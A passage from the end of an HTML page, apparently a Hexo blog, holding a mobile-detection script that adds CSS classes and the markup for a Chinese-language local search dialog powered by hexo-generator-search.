src="/js/search/local-search.js"></script><script>/Android|webOS|iPhone|iPod|BlackBerry/i.test(navigator.userAgent)&&($("#nav").addClass("is-mobile"),$("footer").addClass("is-mobile"))</script><div class="search-dialog" id="local-search"><div class="search-dialog__title" id="local-search-title">本地搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章"></div></div></div><hr><div id="local-search-results"><div id="local-hits"></div><div id="local-stats"><div class="local-search-stats__hr" id="hr"><span>由</span> <a href="https://github.com/wzpan/hexo-generator-search" style="color:#49B1F5">hexo-generator-search</a> <span>提供支持</span></div></div></div><span class="search-close-button"><i class="fa fa-times"></i></span></div><div class="search-mask"></div></body></html><!-- rebuild by neat -->